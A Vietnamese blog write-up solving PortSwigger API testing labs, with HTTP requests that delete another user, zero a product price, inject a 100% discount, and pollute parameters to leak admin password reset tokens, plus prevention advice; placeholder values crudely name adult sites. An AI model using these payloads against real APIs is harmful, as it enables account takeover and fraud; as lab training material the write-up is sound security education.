---
title: "[PortSwigger Lab] - API Testing"
description: Solution of API Testing Lab
date: 2025-06-21 23:59:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, api testing]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-21-portswigger-lab-api-testing/api-testing.png
    alt: API Testing
---

## Introduction
---
### **Application Programming Interface (API)** 
**Application Programming Interface (API)** là cầu nối giúp các **phần mềm** hoặc **hệ thống** giao tiếp với nhau.

#### What is API used for?

| Mục đích                           | Ví dụ                                                         |
| ---------------------------------- | ------------------------------------------------------------- |
| **Trao đổi dữ liệu giữa hệ thống** | Website lấy dữ liệu thời tiết từ server qua API               |
| **Tách biệt frontend & backend**   | Web giao diện gọi API backend để xử lý                        |
| **Cho phép tích hợp dịch vụ**      | Ứng dụng bên thứ ba dùng API của Facebook/Google để đăng nhập |

#### Common API Types

| Loại API            | Mô tả                                                                         |
| ------------------- | ----------------------------------------------------------------------------- |
| **Web API**         | Cho phép ứng dụng web/mobile truy cập dữ liệu qua HTTP (ví dụ: REST, GraphQL) |
| **Library API**     | Hàm/thư viện được lập trình sẵn để lập trình viên sử dụng                     |
| **OS API**          | Hệ điều hành cung cấp hàm để truy cập phần cứng, file,...                     |
| **Third-party API** | API từ bên thứ ba như Stripe (thanh toán), Google Maps, Twilio,...            |

### API Recon
**Recon (reconnaissance)** trong bảo mật là bước đầu tiên để thu thập thông tin càng nhiều càng tốt về mục tiêu. Trong ngữ cảnh **API**, mục tiêu là tìm ra:
- Các **endpoint** (điểm giao tiếp API).
- Cách mà **API** xử lý dữ liệu.
- Các phương thức, định dạng, xác thực, giới hạn,...

#### Xác định API Endpoints
**Endpoint** là các **URL** mà **API** sử dụng để nhận yêu cầu.

```http
GET /api/books HTTP/1.1
Host: xnxx.com
```
- `/api/books` là **endpoint**.

### **Server-side Parameter Pollution**
Đây là một loại lỗ hổng xảy ra khi ứng dụng phía **server** chèn đầu vào từ người dùng vào yêu cầu nội bộ **(internal request)** gửi đến một **API** hoặc hệ thống khác mà không xử lý hoặc mã hóa đúng cách.

## Solve API Testing Lab
---
### Lab: Exploiting an API endpoint using documentation
- Login bằng account `wiener`
- Sử dụng chức năng **change email** => xuất hiện **endpoint** => Gửi đến **Repeater**

```http
PATCH /api/user/wiener HTTP/2
Host: 0a8a004104779f70802fdb6700e600e5.web-security-academy.net
...
{"email":"a@gmail.com"}
```
- Method **PATCH**: được dùng để cập nhật một phần tài nguyên trên **server**
- Xóa `wiener` ra khỏi **path** và gửi lại => `error`
- Tiếp tục xóa `user` ra khỏi **path** và gửi lại => status code `302`
- Thử sử dụng method **GET** với **endpoint** `/api` => trả về trang **REST API**
- Sử dụng **browser** để truy cập và xóa người dùng `carlos` thông qua **Verb DELETE** hoặc có thể gửi lại theo request sau

```http
DELETE /api/user/carlos HTTP/2
Host: 0a8a004104779f70802fdb6700e600e5.web-security-academy.net
```

### Lab: Finding and exploiting an unused API endpoint
- Login bằng account `wiener` => `nghèo kiết xác`
- Thêm `Lightweight "l33t" Leather Jacket` vào giỏ hàng => xuất hiện **endpoint** => Gửi đến **Repeater**

```http
GET /api/products/1/price HTTP/2
Host: 0aab006403c8d279809f856f00d500a6.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 90

{"price":"$1337.00","message":"This item is in high demand - 11 purchased in the last 3h"}
```
- Số dư không đủ để mua
- Thay đổi method thành `POST`**(Chuột phải > Change Request method)** 

```http
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```
- Chỉ cho phép method **GET**, **PATCH**
- Gửi request với method **PATCH** để thay đổi giá món hàng về `$0.00`
  - Thay đổi method sang **PATCH**
  - **Content-Type:** `application/json`
  - Quan sát **response** ban đầu ta sẽ thấy key **price** được trả về, thử gửi với key **price** dạng **json**

```http
PATCH /api/products/1/price HTTP/2
Host: 0aab006403c8d279809f856f00d500a6.web-security-academy.net
...
{"price": 0}
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}
```
- Đã thay đổi được giá => mua với giá `$0.00`

### Lab: Exploiting a mass assignment vulnerability
- Login bằng account `wiener` => `nghèo kiết xác`
- Thực hiện mua hàng => `INSUFFICIENT_FUNDS`
- Thay đổi **path** đến `/api` => chỉ có **POST** và **GET** checkout
- **POST request checkout**

```http
POST /api/checkout HTTP/2
Host: 0afa007d04d4c5a8815239e1005f002a.web-security-academy.net
...
{
  "chosen_products":[
    {
      "product_id":"1",
      "quantity":1
    }
  ]
}
```
- **Get request chekcout**

```http
GET /api/checkout HTTP/2
Host: 0afa007d04d4c5a8815239e1005f002a.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{
  "chosen_discount":{
    "percentage":0
  },
  "chosen_products":[
    {
      "product_id":"1",
      "name":"Lightweight \"l33t\" Leather Jacket",
      "quantity":1,
      "item_price":133700
    }
  ]
}
```
- Gửi các **request** trên tới **Repeater**
- Ta thấy có key `"chosen_discount"` biểu thị giảm giá món hàng được bao nhiêu
- Thử gửi **POST request checkout** kèm với `"chosen_discount"` với `"percentage":100`

```http
POST /api/checkout HTTP/2
Host: 0afa007d04d4c5a8815239e1005f002a.web-security-academy.net
...
{
  "chosen_products":[
    {
      "product_id":"1",
      "quantity":1
    }
  ],
  "chosen_discount":{
    "percentage": 100
  }
}
```
- Thanh toán thành công khi giảm giá `100%`
- Ứng dụng không kiểm tra chặt số dư của người dùng

### Lab: Exploiting server-side parameter pollution in a query string

| Kỹ thuật             | Payload               | Mục tiêu                               |
| -------------------- | --------------------- | -------------------------------------- |
| Truncation           | `%23foo`              | Cắt bỏ các tham số sau                 |
| Inject invalid param | `%26foo=xyz`          | Chèn tham số không hợp lệ              |
| Inject valid param   | `%26email=test@x.com` | Chèn tham số hợp lệ để khai thác logic |
| Override             | `%26name=admin`       | Ghi đè tham số chính                   |

#### Analysis
- Sử dụng chức năng **change password** với **user** `administrator`
- Gửi request đến **Repeater**

```http
POST /forgot-password HTTP/2
Host: 0a35006d0421b29980007b04008e0092.web-security-academy.net
...
csrf=ArTFQBrfM4JEnexXpScOuEWnt7fE9gzs&username=administrator
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"type":"email","result":"*****@normal-user.net"}
```
- Ta thấy nó trả về **email**
- Thử **username** với **value** sai

```json
{"type":"ClientError","code":400,"error":"Invalid username."}
```
- Thử thêm **param**, sử dụng `&` được **encode**

```http
POST /forgot-password HTTP/2
Host: 0a35006d0421b29980007b04008e0092.web-security-academy.net
...
csrf=ArTFQBrfM4JEnexXpScOuEWnt7fE9gzs&username=administrator%26xnxx=pornhub
```

```json
{"error": "Parameter is not supported."}
```
- Cho thấy đã **inject** được => không **support param** `xnxx`
- Sử dụng **fragment (#)** để bỏ qua **param** phía sau

```http
POST /forgot-password HTTP/2
Host: 0a35006d0421b29980007b04008e0092.web-security-academy.net
...
csrf=ArTFQBrfM4JEnexXpScOuEWnt7fE9gzs&username=administrator%26
```

```json
{"error": "Field not specified."}
```
- Dựa vào **response** ta thấy ứng dụng gửi **request** đến **API** nội bộ nhưng thiếu **param** `field`, tương tự như sau

```http
POST /internal-api/reset?username=administrator#field=email HTTP/1.1
```
- Ta sẽ sử dụng `&` để thêm field do mình kiểm soát và `#` để **internal api** bỏ qua `field=email`
- Thử xem kết quả có giống request ban đầu hay không

```http
POST /forgot-password HTTP/2
Host: 0a35006d0421b29980007b04008e0092.web-security-academy.net
...
csrf=ArTFQBrfM4JEnexXpScOuEWnt7fE9gzs&username=administrator%26field=email%23
```
- Kết quả thực sự như vậy

#### Exploit
- Thử gửi **request** với **field** yêu cầu là `username` => trả về username 

```http
POST /forgot-password HTTP/2
Host: 0a35006d0421b29980007b04008e0092.web-security-academy.net
...
csrf=ArTFQBrfM4JEnexXpScOuEWnt7fE9gzs&username=administrator%26field=email%23
```

```json
{"type":"username","result":"administrator"}
```

- Quan sát các **request** trước đó ta thấy có **request** đến `/static/js/forgotPassword.js` có chứa dữ liệu cần thiết

```js
if (resetToken)
  {
      window.location.href = `/forgot-password?reset_token=${resetToken}`;
  }
```
- Có **param** `reset_token`, thử với request trên để nó có trả về giống **username** và **email** của `administrator` không

```http
POST /forgot-password HTTP/2
Host: 0a35006d0421b29980007b04008e0092.web-security-academy.net
...
csrf=ArTFQBrfM4JEnexXpScOuEWnt7fE9gzs&username=administrator%26field=reset_token%23
```

```json
{"type":"reset_token","result":"rcrs5af6zwynto5inf89bq1mz3glntq9"}
```
- Truy cập đường dẫn để thay đổi **password**

```
https://0a35006d0421b29980007b04008e0092.web-security-academy.net/forgot-password?reset_token=rcrs5af6zwynto5inf89bq1mz3glntq9
```

### Lab: Exploiting server-side parameter pollution in a REST URL
#### Analysis
- Sử dụng chức năng **change password** với **user** `administrator`
- Gửi **request** đến **Repeater**

```http
POST /forgot-password HTTP/2
Host: 0a50006f044669348183125b000800ba.web-security-academy.net
...
csrf=iDgI1pUQjJwdvw0Lav08NcfdE7dCC5Kj&username=administrator
```

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"type":"email","result":"*****@normal-user.net"}
```
- Ta thấy nó trả về **email**
- Thử thay đổi **request** thành 

```http
POST /forgot-password HTTP/2
Host: 0a50006f044669348183125b000800ba.web-security-academy.net
...
csrf=iDgI1pUQjJwdvw0Lav08NcfdE7dCC5Kj&username=administrator../../administrator
```
- Kết quả trả về như ban đầu => **Path Traversal**
- Sử dụng **max path traversal**

```http
POST /forgot-password HTTP/2
Host: 0a50006f044669348183125b000800ba.web-security-academy.net
...
csrf=iDgI1pUQjJwdvw0Lav08NcfdE7dCC5Kj&username=administrator../../../../../../
```

```json
{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

- Tìm đến file **openapi.json** để hiểu được cấu trúc **api**

```http
POST /forgot-password HTTP/2
Host: 0a50006f044669348183125b000800ba.web-security-academy.net
...
csrf=iDgI1pUQjJwdvw0Lav08NcfdE7dCC5Kj&username=administrator../../../../../../openapi.json%23
```

```json
{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```
- Sử dụng **fragment (#)** để bỏ qua **param** phía sau để tránh lỗi
- Cấu trúc **api** `/api/internal/v1/users/{username}/field/{field}`

#### Exploit
- Thử lấy **email** của `administrator` => Giống như ban đầu

```http
POST /forgot-password HTTP/2
Host: 0a50006f044669348183125b000800ba.web-security-academy.net
...
csrf=iDgI1pUQjJwdvw0Lav08NcfdE7dCC5Kj&username=administrator/field/email%23
```

```json
{"type":"email","result":"*****@normal-user.net"}
```
- Quan sát các **request** trước đó ta thấy có **request** đến `/static/js/forgotPassword.js` có chứa dữ liệu cần thiết

```js
if (resetToken)
{
    window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
}
```
- Có **param** `passwordResetToken`, thử với request trên để nó có trả về giống **username** và **email** của `administrator` không

```http
POST /forgot-password HTTP/2
Host: 0a50006f044669348183125b000800ba.web-security-academy.net
...
csrf=iDgI1pUQjJwdvw0Lav08NcfdE7dCC5Kj&username=administrator/field/passwordResetToken%23
```

```json
{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}
```
- **Version** hiện tại chỉ hỗ trợ trường **email**, ta thử **version** khác, dựa vào cấu trúc **API** đã tìm thấy

```http
POST /forgot-password HTTP/2
Host: 0a50006f044669348183125b000800ba.web-security-academy.net
...
csrf=iDgI1pUQjJwdvw0Lav08NcfdE7dCC5Kj&username=../../v1/users/administrator/field/passwordResetToken%23
```

```json
{
  "type": "passwordResetToken",
  "result": "odrfrqttqwg9byk48earnzdv3ytn3tei"
}
```
- Truy cập đường dẫn để thay đổi **password**

```
https://0a50006f044669348183125b000800ba.web-security-academy.net/forgot-password?passwordResetToken=odrfrqttqwg9byk48earnzdv3ytn3tei
```
- Bạn có thể thử với `../../v2/users/administrator/field/passwordResetToken%23` => Đây là phiên bản sử dụng thực, chỉ cho phép trường **email**

## Prevent
---
1. Bảo vệ tài liệu **API**
- Nếu **API** không được thiết kế để công khai, bạn không nên để tài liệu **API** (như **Swagger/OpenAPI**) được truy cập tự do.
- Việc để lộ tài liệu **API** có thể giúp kẻ tấn công khám phá các **endpoint** và **chức năng** ẩn.

2. Cập nhật tài liệu **API** thường xuyên
- Việc đảm bảo tài liệu **API** luôn đúng và đầy đủ giúp các nhà phát triển và kiểm thử viên hiểu đúng cách sử dụng **API**, tránh lỗi do hiểu sai.
- Đồng thời cũng giúp dễ dàng phát hiện bất thường hoặc điểm tấn công khi đánh giá bảo mật.

3. Sử dụng danh sách cho phép **(Allowlist) HTTP Methods**
- Chỉ cho phép các **HTTP method** cần thiết như: `GET`, `POST`, `PUT`, `DELETE`...
- **Ví dụ:** Endpoint `/api/user` chỉ nên chấp nhận `GET` và `PATCH`, không nên xử lý `OPTIONS`, `TRACE`, `CONNECT` nếu không dùng đến.

4. Xác thực **Content-Type**
- Kiểm tra xem mỗi **request** có đúng loại dữ liệu mà **server** mong đợi không.
  - Ví dụ: **API** chỉ nên chấp nhận `Content-Type: application/json` nếu nó xử lý **JSON**.
- Ngăn chặn các kiểu dữ liệu không hợp lệ như `text/xml`, `multipart/form-data`... nếu không được hỗ trợ.

5. Sử dụng thông báo lỗi chung chung (Generic error messages)

6. Bảo vệ tất cả các phiên bản **API**
- Không chỉ bảo vệ phiên bản đang hoạt động (`v1`, `v2`...), mà cả những **phiên bản cũ** hoặc **chưa phát hành**.
- Kẻ tấn công thường tìm cách truy cập các phiên bản cũ hơn vì chúng có thể chứa lỗi chưa được vá.

7. Ngăn chặn lỗ hổng **Mass Assignment**
- **Mass Assignment** là khi **framework backend** tự động gán các giá trị từ **request** vào **object** nội bộ mà không kiểm soát.
- Biện pháp:
  - **Allowlist:** Chỉ rõ ràng định nghĩa các thuộc tính nào được phép cập nhật từ phía người dùng (ví dụ: `username`, `email`).
  - **Blocklist** (nếu cần): Chặn rõ ràng các thuộc tính nhạy cảm như **isAdmin**, **role**, **createdAt**, **userId**.

---
Goodluck! 🍀🍀🍀 


